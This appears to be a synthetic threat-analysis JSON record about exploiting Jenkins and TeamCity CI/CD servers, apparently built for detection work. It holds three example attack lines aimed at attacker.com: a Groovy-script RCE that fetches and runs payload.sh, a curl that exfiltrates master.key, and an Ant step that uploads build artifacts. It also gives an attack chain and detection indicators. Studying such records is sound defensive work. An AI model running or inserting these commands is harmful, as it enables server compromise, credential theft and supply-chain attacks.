@@ -1,0 +1,129 @@
+{
+  "package_info": {
+    "package_name": "Jenkins (CVE-2024-23897) / TeamCity (CVE-2023-42793)",
+    "package_manager": "N/A (CI/CD platforms, not traditional package managers)",
+    "package_versions": "Jenkins: versions vulnerable to CVE-2024-23897; TeamCity: versions vulnerable to CVE-2023-42793",
+    "why_malicious": "These CI/CD platforms, when unpatched, contain critical vulnerabilities that enable remote code execution (RCE). Attackers exploiting these flaws can gain unauthorized access to build servers, manipulate build processes, steal sensitive assets such as source code and signing certificates, and inject malicious code into the software supply chain, thereby compromising downstream consumers and enabling large-scale supply chain attacks."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (remote code execution via web interface or API)",
+        "file_location": "Jenkins core server (exploited via HTTP API endpoints)",
+        "required_permissions": [
+          "network",
+          "filesystem",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "curl -X POST 'http://jenkins.example.com/script' --data 'script=java.lang.Runtime.getRuntime().exec(\"wget http://attacker.com/payload.sh -O- | sh\")'",
+      "code_language": "shell (executed via Java Runtime from Groovy/Java context)",
+      "code_behavior": "At runtime, the attacker exploits a Jenkins RCE vulnerability via the web/API interface, executes arbitrary shell commands using Java Runtime, downloads a remote payload from attacker.com, and executes it on the build server, resulting in full server compromise.",
+      "malice_analysis": {
+        "why_suspicious": "Execution of arbitrary shell commands through a web-exposed API endpoint is highly abnormal and dangerous, especially when used to download and execute external scripts from untrusted domains.",
+        "violated_expectations": "Normal Jenkins operation should never allow unauthenticated or unauthorized users to execute arbitrary code on the server via web/API endpoints.",
+        "similar_legitimate_use": "Jenkins administrators may run scripts for legitimate maintenance, but such actions are always authenticated and never involve fetching and executing code from untrusted, external sources.",
+        "key_indicators": [
+          "Use of java.lang.Runtime.getRuntime().exec or similar APIs in web-exposed endpoints",
+          "Network calls to external, non-whitelisted domains (e.g., attacker.com)",
+          "Execution of shell commands from the CI/CD server context via API"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (post-exploitation persistence or data exfiltration)",
+        "file_location": "Injected into build scripts or server configuration",
+        "required_permissions": [
+          "filesystem",
+          "network",
+          "environment_vars"
+        ]
+      },
+      "code_snippet": "cat /var/lib/jenkins/secrets/master.key | curl -X POST -d @- http://attacker.com/exfil",
+      "code_language": "shell",
+      "code_behavior": "At runtime, after initial compromise, the code reads the Jenkins master.key secret file, sends its contents via HTTP POST to an attacker-controlled server, and exfiltrates sensitive credentials, enabling further unauthorized access.",
+      "malice_analysis": {
+        "why_suspicious": "Accessing and exfiltrating secret keys and credentials to an external server is a clear indicator of malicious activity and data theft.",
+        "violated_expectations": "Build scripts and server processes should never access or transmit sensitive secrets such as master.key to any external location, especially over the public internet.",
+        "similar_legitimate_use": "There is no legitimate use case for exfiltrating master.key or other sensitive secrets outside the organization; such files should only be accessed by trusted, internal processes.",
+        "key_indicators": [
+          "Access to sensitive files such as /var/lib/jenkins/secrets/master.key or credentials.xml",
+          "Outbound HTTP POST requests to untrusted or attacker-controlled domains",
+          "Use of command-line tools (e.g., curl, cat) for data exfiltration from the CI/CD environment"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "build-time (supply chain attack injection)",
+        "file_location": "Injected into build pipeline scripts (e.g., build.gradle, pom.xml, build steps)",
+        "required_permissions": [
+          "filesystem",
+          "network"
+        ]
+      },
+      "code_snippet": "<exec executable=\"curl\"><arg value=\"-X\"/><arg value=\"POST\"/><arg value=\"-d\"/><arg value=\"@artifact.jar\"/><arg value=\"http://attacker.com/upload\"/></exec>",
+      "code_language": "XML (Ant/Maven build step)",
+      "code_behavior": "At build-time, the injected code uploads built artifacts (e.g., artifact.jar) to an external attacker-controlled server using a network POST request, enabling attackers to tamper with or analyze the software before public release, resulting in supply chain compromise.",
+      "malice_analysis": {
+        "why_suspicious": "Unauthorized transfer of build artifacts to external, non-corporate locations is a hallmark of supply chain compromise and can lead to the distribution of trojanized software.",
+        "violated_expectations": "Build artifacts should only be published to trusted, internal repositories; uploading to unapproved external endpoints is never legitimate.",
+        "similar_legitimate_use": "Legitimate artifact uploads are restricted to internal artifact repositories (e.g., Nexus, Artifactory) and never to arbitrary external domains.",
+        "key_indicators": [
+          "Build scripts containing external upload commands (e.g., curl POST to non-corporate domains)",
+          "Network destinations in build steps that are outside approved artifact repositories",
+          "Unexpected modifications to build pipeline scripts to include external data transfers"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker exploits Jenkins/TeamCity RCE vulnerability to gain code execution on the CI/CD server.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Privilege escalation and persistence on the build server"
+    },
+    {
+      "step": 2,
+      "action": "Attacker accesses and exfiltrates sensitive secrets and credentials from the compromised server.",
+      "implemented_by": [
+        "snippet_2"
+      ],
+      "leads_to": "Ability to impersonate build server or access downstream systems"
+    },
+    {
+      "step": 3,
+      "action": "Attacker injects malicious code or exfiltration steps into the build pipeline, targeting downstream consumers.",
+      "implemented_by": [
+        "snippet_3"
+      ],
+      "leads_to": "Supply chain compromise and potential distribution of trojanized software"
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Unexpected execution of shell commands via CI/CD web/API interfaces",
+      "Outbound network connections to untrusted or unknown domains from build servers",
+      "Access to sensitive files (e.g., secrets, credentials) by build scripts or processes",
+      "Modification of build pipeline scripts to include external upload or exfiltration commands"
+    ],
+    "file_indicators": [
+      "Build scripts (Jenkinsfile, build.gradle, pom.xml, etc.) containing curl/wget or external upload commands",
+      "Unexpected changes to /var/lib/jenkins/secrets/* or TeamCity configuration files",
+      "Presence of unauthorized scripts or binaries in the build workspace or pipeline definitions"
+    ],
+    "network_indicators": [
+      "HTTP/S POST requests to attacker-controlled domains (e.g., attacker.com, webhook.site)",
+      "Unusual artifact uploads to non-corporate or unapproved endpoints",
+      "Outbound connections initiated during build or post-build steps to external IPs/domains"
+    ],
+    "how_to_detect": "Monitor CI/CD server logs for unexpected script execution, especially via web/API endpoints. Alert on build scripts or pipeline definitions containing network upload or exfiltration commands to non-approved domains. Track access to sensitive files and outbound network activity from build environments. Use file integrity monitoring to detect unauthorized changes to build scripts and configuration files. Correlate network logs with build events to identify suspicious data transfers."
+  }
+}
